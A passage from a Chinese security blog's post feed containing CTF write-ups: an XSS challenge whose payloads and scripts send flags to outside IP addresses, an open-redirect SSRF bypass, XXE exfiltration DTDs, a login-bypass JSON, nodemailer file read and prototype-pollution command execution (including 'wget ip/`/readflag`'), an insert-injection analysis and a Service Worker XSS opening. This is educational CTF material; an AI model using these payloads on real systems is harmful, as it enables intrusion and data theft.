&#123;&#125; &#125; &#125;&#125;createXmlHttp();xmlHttp.onreadystatechange = function()&#123; if (xmlHttp.readyState == 4) &#123; code=escape(xmlHttp.responseText); createXmlHttp(); window.location.href=&quot;http://129.204.230.95/xss/myxss/?a=&quot;+code; &#125;&#125;;xmlHttp.open(&quot;GET&quot;, &quot;/xsstest/1.txt&quot;, true);xmlHttp.send(null);;a=(&#123;//%22;http://47.104.192.54:8888/about?theme=&quot;;&#125;);xmlHttp=new XMLHttpRequest();xmlHttp.onreadystatechange=function()&#123;if(xmlHttp.readyState==4)&#123;code=escape(xmlHttp.responseText);window.location.href=&quot;http://129.204.230.95/xss/myxss/?a=&quot;+code;&#125;&#125;;xmlHttp.open(&quot;GET&quot;,&quot;/xsstest/1.txt&quot;,true);xmlHttp.send(null);;a=(&#123;//&quot;;var script=document.createElement(&quot;script&quot;);script.setAttribute(&quot;sr&quot;+&quot;c&quot;,&quot;http://129.204.230.95/1.js&quot;);document.head.appendChild(script);http://47.104.192.54:8888/about?theme=%22;&#125;);var%09script=document.createElement(%22script%22);script.setAttribute(%22sr%22%2b%22c%22,%22http://129.204.230.95/1.js%22);document.head.appendChild(script);a=(&#123;//%22; 成功传输到XSS平台的payload 经过一番调之后，终于发现一个能打的payload： 123http://47.104.192.54:8888/about?theme=%22;&#125;);$.post(%22/flag%22,function(response)&#123;location.href=%22http://129.204.230.95/xss/myxss/?a=%22%2bresponse;&#125;);a=(&#123;//%22;http://localhost:8888/about?theme=%22%3b%7d)%3b%24.post(%22%2fflag%22%2cfunction(response)%7blocation.href%3d%22http%3a%2f%2f129.204.230.95%2fxss%2fmyxss%2f%3fa%3d%22%2bresponse%3b%7d)%3ba%3d(%7b%2f%2f%22%3b 以上payload虽然可用，但没有返回结果，因为 /flag 处还有一个flag猜解的操作，要验证payload的可用性，想在xss平台看到一些回应可以用以下payload先返回一下其他页面： 1http://localhost:8888/about?theme=%22%3b%7d)%3b%24.post(%22%2fhint%22%2cfunction(response)%7blocation.href%3d%22http%3a%2f%2f129.204.230.95%2fxss%2fmyxss%2f%3fa%3d%22%2bresponse%3b%7d)%3ba%3d(%7b%2f%2f%22%3b /flag 路由下的flag猜解 hint页面给了/flag路由下的逻辑，只有flag的前几位猜对时才返回 /flag 的前几位，所以实际做题时需要一位位的猜解： 12345678910111213141516171819202122app.all(\"/flag\", auth, async (req, res, next) =&gt; &#123; if (req.session.isadmin &amp;&amp; typeof req.query.var === 'string') &#123; fs.readFile('/flag', 'utf8', (err, flag) =&gt; &#123; let flagArray = flag.split(''); let dataArray = req.query.var.split(''); let check = true; for (let i = 0; i &lt; dataArray.length &amp;&amp; i &lt; flagArray.length; i++) &#123; //按位对比，输入多长的flag，对比输出多长 if (dataArray[i] !== flagArray[i]) &#123; check = false; break &#125; &#125; if (check) &#123; res.status(200).send(req.query.var); &#125; else &#123; res.status(500).send('Keyword Error!'); &#125; &#125;); &#125; else &#123; res.status(500).send('Sorry, you are not admin!'); &#125;&#125;); 最后需要用脚本来做，给出一个帮助理解的poc（用来猜flag第一位为 f ）： 1http://localhost:8888/about?theme=%22%3b%7d)%3b%24.post(%22%2fflag%3fvar%3df%22%2cfunction(response)%7blocation.href%3d%22http%3a%2f%2f129.204.230.95%2fxss%2fmyxss%2f%3fa%3d%22%2bresponse%3b%7d)%3ba%3d(%7b%2f%2f%22%3b 做题脚本（半自动化的，一次执行只猜一位）： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import requestsurl1 = 'http://47.104.155.242:8888'url2 = 'http://47.104.192.54:8888'url3 = 'http://47.104.210.56:8888'url3='http://8.129.41.25:8888'payload = 'http://localhost:8888/about?theme=%22%3b%7d)%3b%24.post(%22%2fflag%22%2cfunction(response)%7blocation.href%3d%22http%3a%2f%2f129.204.230.95%2fxss%2fmyxss%2f%3fa%3d%22%2bresponse%3b%7d)%3ba%3d(%7b%2f%2f%22%3b'flag_h='flag'words='&#125;&#123;0123456789abcdefghijklmnopqrstuvwxyz-_'# payload = 'http://localhost:8888/about?theme=%22%3b%7d)%3b%24.post(%22%2f%22%2cfunction(response)%7blocation.href%3d%22http%3a%2f%2f129.204.230.95%2fxss%2fmyxss%2f%3fa%3d%22%2bresponse%3b%7d)%3ba%3d(%7b%2f%2f%22%3b'# payload = 'http://localhost:8888/about?theme=%22%3b%7d)%3blocation.href%3d%22http%3a%2f%2f129.204.230.95%2fxss%2fmyxss%2f%3fa%3d123%22%3ba%3d(%7b%2f%2f%22%3b'sess1 = requests.Session()sess2 = requests.Session()sess3 = requests.Session()def regist(sess, url): data = &#123; 'username': '3', 'password': '3', 'submit': 'submit' &#125; reg_url = url+'/register' return sess.post(reg_url, data=data)def login(sess, url): data = &#123; 'username': '3', 'password': '3', 'submit': 'submit' &#125; login_url = url+'/login' return sess.post(login_url, data=data)def upload_url(sess, url,word): flag=flag_h+word payload='http://localhost:8888/about?theme=%22%3b%7d)%3b%24.post(%22%2fflag%3fvar%3d'+flag+'%22%2cfunction(response)%7blocation.href%3d%22http%3a%2f%2f129.204.230.95%2fxss%2fmyxss%2f%3fa%3d%22%2bresponse%3b%7d)%3ba%3d(%7b%2f%2f%22%3b' data = &#123; 'url': payload &#125; up_url = url+'/report' return sess.post(up_url, data=data)while 1: # if 'Report success!' not in upload_url(sess1, url1).text: # print(regist(sess1, url1).text) # print(login(sess1, url1).text) # if 'Report success!' not in upload_url(sess2, url2).text: # print(regist(sess2, url2).text) # print(login(sess2, url2).text) # print(regist(sess3, url3).text) # print(login(sess3, url3).text) for word in words: print(flag_h+ word) regist(sess3, url3) login(sess3, url3) upload_url(sess3, url3,word) 做题的恶劣环境下的解法 赛后看B乎，看到Zeddy大佬说恶劣环境可能也是做题考察的一部分，学到了（应该不是出题者本意，但也学习了），参考Nu1L的WP，可以引用远程的JS，并且在js中猜测flag（避免了猜一位的多次网络交互，但也需要一位一位的猜很多次）： 直接读取了nonce，很有意思： 12345http://localhost:8888/about?theme=\";&#125;);var%09c=document.createElement(\"script\");$(c).attr(\"nonce\",$(\"script\")[2].nonce);$(c).attr(\"s\"%2b\"rc\",\"//58.87.73.74:8887/test.js\");document.head.append(c);console.log(&#123;\"te\":\"\",// 用js在受害者端一位一位的猜flag： 123456789101112131415161718192021222324252627var cccc = \"flag&#123;6bb77f8b-6bc8-4b9e-b654-8a4da5ae920d\"function post(ch) &#123; cccc = cccc + ch; document.location = \"http://58.87.73.74:8887/\" + cccc;&#125;function test(ch) &#123; url = \"http://localhost:8888/flag?var=\" + cccc + ch; // console.log(url); fetch(url).then(response =&gt; &#123; if (response.status == 200) &#123; post(ch) &#125; &#125;);&#125;// for(var i=0; i&lt;5; i++) &#123;var charset = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', '-', '&#125;']for (var j = 0; j &lt; charset.length; j++) &#123; test(charset[j]);&#125; 其实应该是可以在bot端一口气猜完所有位的，只是现在环境关了不好调js了，感觉这样可能会更好一些。 后话 虽然我很少喷人，但这次真的想喷一下，主办方的人说“半自动化非常花时间，在正常比赛中不可能做的出来”，在我的做题时间点看来，如果bot服务是流畅的（比如独立的靶机），完全能够半自动的做出来的，虽然肯定不及更加优化的解题方案，但这种正常的情况应该也是能够得分的。虽然从某些人的角度来说，就比赛上确实不公，但是bot频频挂掉确实不应该是所谓的“正常情况”。特别是最后一波“本地验证”的操作，令人哭笑不得。","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/tags/Web安全/"}]},{"title":"由一道CTF学习相对路径重定向引发的开放重定向：津门杯2021-GoOSS","slug":"由一道CTF学习相对路径重定向引发的开放重定向：津门杯2021-GoOSS","date":"2021-06-07T06:57:35.000Z","updated":"2025-02-06T15:11:52.011Z","comments":true,"path":"posts/Web安全/20210607-open_redirect01.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20210607-open_redirect01.html","excerpt":"由一道CTF学习相对路径重定向引发的开放重定向：津门杯2021-GoOSS 由一道CTF学习相对路径重定向引发的开放重定向：津门杯2021-GoOSS 涉及到的知识点 漏洞点分析 fileSystem.Open的绕过 fi.IsDir()的绕过 获取flag的payload 重定向为相对路径下的漏洞 参考资料","text":"由一道CTF学习相对路径重定向引发的开放重定向：津门杯2021-GoOSS 由一道CTF学习相对路径重定向引发的开放重定向：津门杯2021-GoOSS 涉及到的知识点 漏洞点分析 fileSystem.Open的绕过 fi.IsDir()的绕过 获取flag的payload 重定向为相对路径下的漏洞 参考资料 涉及到的知识点 文件路径解析过程和URL的差异 相对路径重定向 开放重定向 题外话：对象存储服务(Object Storage Service,简称OSS)；本题的OSS只是一个幌子。 漏洞点分析 在文件中间件处，存在一处相对路径重定向的操作：c.Redirect(302, c.Request.URL.String()+&quot;/&quot;)，这里的开发目的很好理解：如果用户输入的为路径，但又没有加/，则使用相对重定向（相对重定向是关键，在后文会讲）将url定向到路径（添加一个/） 但是利用时有3个条件：fileSystem.Open(c.Request.URL.String())成功，fi.IsDir()为true，并且路径不以/结尾： 1234567891011121314func fileMidderware(c *gin.Context) &#123; ... f, err := fileSystem.Open(c.Request.URL.String()) if f == nil &#123; c.Next() &#125; ... if fi.IsDir() &#123; if !strings.HasSuffix(c.Request.URL.String(), \"/\") &#123; c.Redirect(302, c.Request.URL.String()+\"/\") //go的302定向可以不输入协议(http:)，即 //127.0.0.1/?file=xxx 前两个条件在绕过时充分体现了Orange大表哥的“不同协议解析差异”问题，此处为文件路径和url解析不同的问题。 fileSystem.Open的绕过 要触发SSRF，首先要使fileSystem.Open(path)正确返回一个文件夹，fileSystem.Open支持虚拟路径，可以用../绕过，在讲绕过方法前，我们先看一下文件路径解析的几种情况（可以体会一下和url解析的差异）： /../：返回上一层 /flag/：flag文件夹 /flag&amp;../：一个名为flag&amp;..的路径 /127.0.0.1:1234/：一个名为127.0.0.1:1234的路径 理解了这四种解析，就可以很容易的理解这道题的绕过方法了，此题有两种绕过方法： {&quot;url&quot;:&quot;http://127.0.0.1:1234//127.0.0.1?file=../../../../../flag&amp;../..&quot;} {&quot;url&quot;:&quot;http://127.0.0.1:1234//129.204.230.95/..&quot;} fi.IsDir()的绕过 直接在路径最后加上/..就会被识别为路径；此外，使用/也会被识别为路径，但本题由于需要结尾不出现/所以不能用。 获取flag的payload 以json格式发送请求：Content-Type: application/json，最终可以有两种利用方法拿flag（直接打127和利用恶意服务器进行重定向）： wp1: 123 /vul&#123;\"url\":\"http://127.0.0.1:1234//127.0.0.1?file=../../../../../flag&amp;../..\"&#125;&#123;\"url\":\"http://127.0.0.1:1234//127.0.0.1?file=/flag&amp;../../..\"&#125; wp2（xx为自己的302跳转的恶意VPS）: 12 /vul&#123;\"url\":\"http://127.0.0.1:1234//xx.xx.xx.xx/..\"&#125; 重定向为相对路径下的漏洞 跳脱题目本身，我们来看看真实情况下的开发动机和案例。 在RFC标准中，302重定向如果没有协议信息，则为相对重定向：Hypertext Transfer Protocol (HTTP/1.1): Semantics and Content： 例： 1Location: /People.html#tim 相当于： 1Location: http://www.example.org/People.html#tim 这样很容易造成开放重定向： 就如本题一样，为了有更好的用户体验，很多框架都有自动处理无斜杠的路径的操作：xxx.com/123被重定向至xxx.com/123/（使用相对重定向/123-&gt;/123/）。 然而如果url为xxx.com//evil.com，如果没有过滤，就会被重定向至//evil.com/，从而从相对路径逃逸到绝对路径。 参考资料 Django URL跳转漏洞分析（CVE-2018-14574 ） vulnerability: open redirect in static handler","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/tags/Web安全/"}]},{"title":"AntCTF2021 部分WP","slug":"AntCTF2021-部分WP","date":"2021-03-09T11:04:04.000Z","updated":"2025-02-06T15:11:50.368Z","comments":true,"path":"posts/Web安全/20210309-ant2021.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20210309-ant2021.html","excerpt":"AntCTF2021 部分WP shellgen2 题目要求 real_cloud_storage 8-bit pub 题目功能点 参数绑定的绕过以及万能密码 nodemailer库文档学习，任意文件读取 shvl原型链污染漏洞patch的绕过 原型链污染链挖掘与艰难的绕过 其他的解法 dnslog 污染 shell 参数 AntCTF2021 部分WP AntCTF结束了，抱群里大腿，战队拿了第15名，TLS流啤。这次AntCTF的质量较高，学到了一些东西，在这里记录一下做题过程中相关的思路。","text":"AntCTF2021 部分WP shellgen2 题目要求 real_cloud_storage 8-bit pub 题目功能点 参数绑定的绕过以及万能密码 nodemailer库文档学习，任意文件读取 shvl原型链污染漏洞patch的绕过 原型链污染链挖掘与艰难的绕过 其他的解法 dnslog 污染 shell 参数 AntCTF2021 部分WP AntCTF结束了，抱群里大腿，战队拿了第15名，TLS流啤。这次AntCTF的质量较高，学到了一些东西，在这里记录一下做题过程中相关的思路。 shellgen2 题目要求 编写一个python脚本，输入任意的小写字符串，输出一个可执行的PHP脚本，要求该脚本输出之前输入的小写字符串，并且除了php标签外，只能使用0-9$_;+[].=&lt;?&gt;中的字符；输出的PHP脚本要尽可能的短。waf具体的描述： 12345678910def waf(phpshell): if not phpshell.startswith(b'&lt;?php'): return True phpshell = phpshell[6:] for c in phpshell: if c not in b'0-9$_;+[].=&lt;?&gt;': return True else: print(chr(c), end='') return False 题目乍一看，是要求写一个能够较灵活生成php的生成器，而且只有很少的字符可用。在这里分为输出、变量储存、字符生成三部分来分析： 输出：考虑使用&lt;?=短标签输出字符串。 变量储存：为了使生成的PHP脚本尽可能短，首先使用09_字符构建变量名储存生成的a-z字符，在这里可以采用09_的所有排列来进行储存，类似于字典，以最大限度缩短payload。需要注意的是，只能将_放在第一位。 字符生成：为了生成a-z，使用两个[]字符串拼接得到ArrayArray，然后用0自增到3以取到其中的a；再使用自增得到字符a-z。 最后的python脚本为： 1234567891011121314151617181920212223242526input_a=input()beg='''&lt;?php $_=[].[];$_999=0;$_999++;$_999++;$_999++;$_=$_[$_999];$____=$_;'''par='_09'let_dic=&#123;&#125;for i in range(3): for j in range(3): for p in range(3): let_dic[chr(97+p+j*3+i*3*3)]=\"$_\"+par[i]+par[j]+par[p]keys=list(let_dic.keys())let_dic[keys[i]]+'=$_;'for i in range(25): beg+='$_++;'+let_dic[keys[i+1]]+'=$_;'beg+='?&gt;&lt;?='+let_dic[input_a[0]]for let in input_a[1:]: beg+='.'+let_dic[let]beg+=';'print(beg,end=\"\") 有一点坑的地方是，原题目没有说具体后台的执行过程，如果仅看题目给的waf信息，在PHP头的地方会不能正确解析（直接截断了 &lt;?php ），在这里卡了很长时间，此处暴打出题人，很坑爹。 real_cloud_storage 这道题过程很简单，但是有些细节比较坑，还有对服务端和客户端的运行过程的合理猜测。 一个上传页面，说是把储存放在了云上，就没有危险了:)传一个马试试，发现上传过程设置了上传的储存urlendpoint，可以设置为任意URL： 12345678910111213141516POST /upload HTTP/1.1Host: fn10051969.serverless.cloud.d3ctf.ioUser-Agent: xxxAccept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://69889ba1b2.real-cloud-storage.d3ctf.io/Content-Type: application/jsonOrigin: http://69889ba1b2.real-cloud-storage.d3ctf.ioContent-Length: 82Connection: closeDNT: 1Sec-GPC: 1&#123;\"endpoint\":\"xxx_url\",\"key\":\"xxx\",\"bucket\":\"xxx\",\"file\":\"xxx\"&#125; 开始的时候没啥头绪，尝试直接访问oss，发现返回了XML。猜测客户端将文件发送到oss，之后oss返回的XML会被客户端解析，所以可能有XXE。 直接一波老生常谈的XXE盲打（oss伪造服务器使用https://requestrepo.com/搭建， Content-Type 改为 application/xml ，注意！要把状态码改为404，因为原oss就是返回了404，否则客户端不会解析XML）： 123456&lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY % file SYSTEM \"file:///flag\"&gt;&lt;!ENTITY % dtd SYSTEM \"http://xxx/data.dtd\"&gt;%dtd; %payload; %send;]&gt; vps: 12&lt;!ENTITY % payload \"&lt;!ENTITY &amp;#37; send SYSTEM 'http://xxx/?data=%file;'&gt;\"&gt; 把endpoint改为requestrepo的url之后在apache日志中找到flag： 18.210.87.229 - - [09/Mar/2021:16:10:44 +0800] \"GET /?data1=d3ctf&#123;2158ba78921c668b152584deb052f5152e33e943&#125;|only cluster\" 400 0 \"-\" \"-\" 8-bit pub 这道题是综合性比较强的题，整个污染链比较有意思，用一个第三方小众库的0day结合nodemailer的一些特性和内部代码进行RCE，并且由于环境具有很多限制，需要多次尝试原型链污染的过程。 整个题的知识点有： mysqljs与nodejs的特性绕过参数绑定的SQL查询。 shvl库的漏洞修复commit的绕过。 nodemailer的原型链污染执行链挖掘。 nodemailer文档学习和利用。 题目功能点 题目给了源码，可以直接本地搭建，题目功能比较简单，注册、登陆、管理员功能页面。在最开始的时候，题目是可以直接注册admin用户的，后来被修复。 参数绑定的绕过以及万能密码 由于nodejs对json请求会直接解析的特性，我们查阅文档并注意到https://github.com/mysqljs/mysql#escaping-query-values中写到： Objects are turned into key = ‘val’ pairs for each enumerable property on the object. 我们找到源码 modules\\users.js 中： 1234567891011121314signin: function(username, password, done) &#123; sql.query( \"SELECT * FROM users WHERE username = ? AND password = ?\", [username, password], function(err, res) &#123; if (err) &#123; console.log(\"error: \", err); return done(err, null); &#125; else &#123; return done(null, res); &#125; &#125; );&#125;, 此处如果传入json: 1&#123;\"username\":\"admin\",\"password\":&#123;\"password\":1&#125;&#125; mysql语句将会把password解析为 key-value 键值对，从而绕过登录： 1SELECT * FROM users WHERE username = 'admin' AND password = `password` = 1 ; nodemailer库文档学习，任意文件读取 登录admin之后，进入admin功能页面，是一个向外发送邮件的功能，这里需要去查nodemailer相关的文档，可以向任意邮箱发送带有附件的邮件。其中，有两种方法都可以把服务器的文件发送出来，达到任意文件读取的目的： https://nodemailer.com/message/，text参数如果是path:xxx键值对，就可以将文件内容以文本形式发送给任意邮箱： 1text - The plaintext version of the message as an Unicode string, Buffer, Stream or an attachment-like object (&#123;path: &apos;/var/data/…&apos;&#125;) https://nodemailer.com/message/attachments/，attachments参数可以直接把文件当作附件整个发出： 1234567891011attachments: [ ...&#123; // file on disk as an attachment filename: 'text3.txt', path: '/path/to/file.txt' // stream this file &#125;, &#123; // filename and content type is derived from path path: '/path/to/file.txt' &#125;, ...] shvl原型链污染漏洞patch的绕过 整个admin的代码很简单，就是一个参数设置与一个邮件发送： 1234567891011121314151617181920212223242526272829const send = require(\"../utils/mail\");const shvl = require(\"shvl\");module.exports = &#123; home: function(req, res) &#123; return res.sendView(\"admin.html\"); &#125;, email: async function(req, res) &#123; let contents = &#123;&#125;; Object.keys(req.body).forEach((key) =&gt; &#123; shvl.set(contents, key, req.body[key]); //将contents的key对象设置为key对应的值（post传入 key=value） &#125;); contents.from = '\"admin\" &lt;admin@8-bit.pub&gt;'; try &#123; await send(contents); //漏洞触发点？发送邮件 return res.json(&#123; message: \"Success.\" &#125;); &#125; catch (err) &#123; return res.status(500).json(&#123; message: err.message &#125;); &#125; &#125;,&#125;; 注意到 shvl 库的使用，很像是原型链污染，直接在github翻到：https://github.com/robinvdvleuten/shvl/issues/34，说到 2.0.1 版本有原型链污染，但是这道题是 2.0.2 ，已经修复了漏洞，我们看一下修复patch，检查了有没有 __proto__ 字符串： patch 然而可以轻松绕过，见NodeJS - proto &amp; prototype Pollution： 1something.constructor.prototype.sayHey = 123; 原型链污染链挖掘与艰难的绕过 根据源码，原型链污染之后就是发送邮件的操作，找到nodemailer库里的 node_modules\\nodemailer\\lib\\sendmail-transport\\index.js 注意到： 1234567...const spawn = require('child_process').spawn;...try &#123; sendmail = this._spawn(this.path, args);&#125; 注意在 node_modules\\nodemailer\\lib\\nodemailer.js 中，如果要执行到 spawn 语句，需要先污染 options.sendmail=ture ： 1234567891011121314if (options.pool) &#123; transporter = new SMTPPool(options);&#125; else if (options.sendmail) &#123; //注意这里 transporter = new SendmailTransport(options);&#125; else if (options.streamTransport) &#123; transporter = new StreamTransport(options);&#125; else if (options.jsonTransport) &#123; transporter = new JSONTransport(options);&#125; else if (options.SES) &#123; transporter = new SESTransport(options);&#125; else &#123; transporter = new SMTPTransport(options);&#125;&#125; 好家伙，这spawn不是直接命令执行，查一下 spawn 的语法： 123456child_process.spawn(command[, args][, options])const &#123; spawn&#125; = require('child_process');const ls = spawn('ls', ['-lh', '/usr']); 跟python的subprocess类似，需要传list的参数。 this.path 能够直接污染，追一下 args ： 123456if (this.args) &#123; // force -i to keep single dots args = ['-i'].concat(this.args).concat(envelope.to);&#125; else &#123; args = ['-i'].concat(envelope.from ? ['-f', envelope.from] : []).concat(envelope.to);&#125; args 需要对 ['-i'] 进行拼接，这里就比较坑了，如果不符合语法，就会执行失败，现在我们需要找到一个命令，格式为： xxx -i xx xx xx 。这个地方卡了比较久，最后群里大师傅用了 sh -i -c 'xxx' ，能够执行命令。 开始的时候，尝试用bash反弹shell，结果返回 spawn bash ENOENT ，网上说是因为命令不存在导致： does not exist 没有bash就不太好反弹shell了，此外，环境还有其他各种限制，看hint： PS: Try to execute /readflag ，结合之前sendmail的任意文件读取，可以先把执行结果写入文件，再把文件传到邮箱里。 先发post包执行命令： 1234567891011&#123; \"to\": \"hachp1@qq.com\", \"subject\": \"test\", \"text\": \"xxxx\", \"constructor.prototype.sendmail\": true, \"constructor.prototype.path\": \"sh\", \"constructor.prototype.args\": [ \"-c\", \"/readflag&gt;/tmp/1\" ]&#125; sendmail读文件： 12345&#123; \"to\": \"hachp1@qq.com\", \"subject\": \"read file\", \"text\": &#123;\"path\": \"/tmp/1\"&#125;&#125; 邮件给flag： flag 其他的解法 看其他战队的WP，发现还有其他的解法，可以使用dnslog、污染shell参数等。 dnslog 参考ChaMd5战队，不用再发邮件了： 1234567&#123; \"constructor.prototype.sendmail\":true, \"constructor.prototype.path\":\"sh\", \"constructor.prototype.args\":[ \"-c\",\"wget ip/`/readflag`\" ] &#125; 污染 shell 参数 参考北极星战队，spawn的shell参数可以指定shell的程序： 123456&#123; \"constructor.prototype.sendmail\": 1, \"constructor.prototype.shell\": \"/bin/sh\", \"constructor.prototype.path\": \"/readflag &gt; /tmp/jjjjjjjjJrXnm\", \"constructor.prototype.args\": [\"\"]&#125;","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/tags/Web安全/"}]},{"title":"[网鼎杯2018]Unfinish-二次注入和insert注入的一个误区","slug":"网鼎杯2018-Unfinish-二次注入和insert注入的一个误区","date":"2020-11-26T08:47:27.000Z","updated":"2025-02-06T15:11:52.048Z","comments":true,"path":"posts/Web安全/20201126-wdbunfinish.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20201126-wdbunfinish.html","excerpt":"[网鼎杯2018]Unfinish-二次注入和insert注入的一个误区 前言 最近日常刷刷buu，发现[网鼎杯2018]Unfinish这题的wp很多都出现了理解错误，将二次注入和insert注入混为一谈，遂手动调之，并作出自己的纠正。","text":"[网鼎杯2018]Unfinish-二次注入和insert注入的一个误区 前言 最近日常刷刷buu，发现[网鼎杯2018]Unfinish这题的wp很多都出现了理解错误，将二次注入和insert注入混为一谈，遂手动调之，并作出自己的纠正。 误区 做题的时候搜了一下wp，看到各wp都说是二次注入，可能是看到注册功能就做题式地条件反射是二次注入；可是我仔细一想，这题不存在二次注入的条件：将数据库中的数据取出后，再一次代入查询语句中，因为直接查询出用户名就行了，并不需要将用户名再代入到语句中查询。 然后我翻到源码，本地部署调试，发现并没有二次注入，是insert注入。 再查了一下，发现很多大师傅的wp都写的二次注入，可见大家对二次注入的概念还存在很大误区： 二次注入与insert注入 二次注入：在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，写入数据库时，转义符被去处。如果程序在下一次进行需要进行查询的时候，直接从数据库中取出脏数据拼接进入SQL语句，没有进行进一步的检验和处理，这样就会造成二次注入。 insert注入，顾名思义，就是insert操作时过滤不严存在注入。 两者完全是从不同维度对注入进行分类，二次注入是从数据流动过程来分类（payload被拼接进SQL语句两次）；insert注入则是从执行语句来分类（执行的是insert语句）；也就是说，insert注入可以是二次注入，也可以是一次注入，比如，在二次注入的过程中，第二次执行SQL语句用到的是insert语句，那么它就是个insert注入。 回到题目，这题是个insert注入，具体分析见下文。 具体分析 题目漏洞点很简单，用户名在入库时过滤不严，只调用了waf函数，对黑名单字符串进行判断： 如果我们构造的语句使insert语句拼接后合法，就会造成insert注入，并将数据写入到数据库中： 需要注意的是，这里用到了数字注入，具体而言，字符串包裹的数字如果以+号连接，则被当做数字处理，可以进行运算： 123456MariaDB [web]&gt; select &apos;1&apos;+&apos;1&apos;;+---------+| &apos;1&apos;+&apos;1&apos; |+---------+| 2 |+---------+ 所以这题直接构造username=0'%2b(select hex(database()))%2b'0即可将database()插入数据库，登录后就能看到其十六进制编码结果，从而达到注入效果。很明显，这并不是一个二次注入。 总结 注册处存在的注入不一定是二次注入，做题还是要在理解的基础上进行 insert注入一般通过再次查询取出我们感兴趣的数据，这一点和二次注入有相似的地方，很可能是这里造成了很多师傅的误解。","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/tags/Web安全/"}]},{"title":"从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss","slug":"从一道CTF学习Service-Worker的利用：西湖论剑2020-hardxss","date":"2020-10-19T13:54:52.000Z","updated":"2025-02-06T15:11:51.278Z","comments":true,"path":"posts/Web安全/20201019-sw_safe.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20201019-sw_safe.html","excerpt":"从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss 从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss 题目初探 JSONP 变量覆盖和DOM XSS Service Worker Service Worker简介 注册Service Worker 构造恶意register Service Worker有效时间 利用1：XSS持久化、拓展XSS攻击面 利用2：跨域XSS Service Worker防御措施 总结 参考资料","text":"从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss 从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss 题目初探 JSONP 变量覆盖和DOM XSS Service Worker Service Worker简介 注册Service Worker 构造恶意register Service Worker有效时间 利用1：XSS持久化、拓展XSS攻击面 利用2：跨域XSS Service Worker防御措施 总结 参考资料 题目初探 首先，题目提供了一个在线访问工具，会去访问提交的url。在“联系站长”处有：嘿~想给我报告BUG链接请解开下面的验证码，只能给我发我网站开头的链接给我哟~我收到邮件后会先点开链接然后登录我的网站！，而登陆时，会以GET请求传入用户名和密码：https://auth.hardxss.xhlj.wetolink.com/api/loginVerify?adminname=123&amp;adminpwd=123 所以本题需要通过XSS拦截并获取登陆时GET请求的密码，然后以admin身份登录，不能通过常规的盗取cookie实现。这就需要Service Worker来操作。 JSONP 通过浏览器network工具，可以发现在login处存在一处jsonp： https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback=get_user_login_status ，网页直接返回了： 1get_user_login_status(&#123;\"status\": false&#125;) 我们访问https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback=alert(1);//，返回： 1alert(1);//(&#123;\"status\":false&#125;) 需要注意的是，这个jsonp限制了返回值的长度。 变量覆盖和DOM XSS 仔细查看login处的js代码，可以发现一处dom xss： 首先，注意到 jsonp 函数会创建 script 标签，并使用 https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback=get_user_login_status 处的jsonp，而该jsonp调用的函数由变量 callback 决定。 在 auto_reg_var 函数中，通过 location.search 获取了请求参数，并通过 window[key] = value 进行了赋值，此处存在变量覆盖漏洞。 结合以上的jsonp和login页面的js，此处存在DOM型XSS，我们只需要通过GET请求传入login页面callback参数，此时会覆盖掉原来的callback并调用jsonp，payload： ?callback=alert(1)// 。 123456789101112131415161718192021222324252627282930313233343536callback = \"get_user_login_status\";auto_reg_var();if (typeof(jump_url) == \"undefined\" || /^\\//.test(jump_url)) &#123; jump_url = \"/\";&#125;jsonp(\"https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback=\" + callback, function(result) &#123; if (result['status']) &#123; location.href = jump_url; &#125;&#125;)function jsonp(url, success) &#123; var script = document.createElement(\"script\"); if (url.indexOf(\"callback\") &lt; 0) &#123; var funName = 'callback_' + Date.now() + Math.random().toString().substr(2, 5); url = url + \"?\" + \"callback=\" + funName; //调用jsonp &#125; else &#123; var funName = callback; &#125; window[funName] = function(data) &#123; success(data); delete window[funName]; document.body.removeChild(script); &#125; script.src = url; document.body.appendChild(script); //执行jsonp的返回函数&#125;function auto_reg_var() &#123; var search = location.search.slice(1); var search_arr = search.split('&amp;'); for (var i = 0; i &lt; search_arr.length; i++) &#123; [key, value] = search_arr[i].split(\"=\"); window[key] = value; //此处存在变量覆盖，可以覆盖掉callback变量 &#125;&#125; 虽然找到了一处XSS，但是题目又说明：“我收到邮件后会先点开链接然后登录我的网站！”，而登录的域名是auth.hardxss.xhlj.wetolink.com，登录和打开链接是在不同的域名，并且需要盗取的信息在请求中而不是在cookie中。又注意到，直接访问https://auth.hardxss.xhlj.wetolink.com/，返回的页面源码的js中包含跨域操作：document.domain = &quot;hardxss.xhlj.wetolink.com&quot;;， 所以此题需要使XSS跨域持久化，这就涉及到本文的主角：Service Worker，通过它和其他页面的跨域操作可以让XSS持久化。此外，由于需要拦截登陆时的参数，其他方法难以做到拦截请求，而SW可以。 Service Worker Service Worker简介 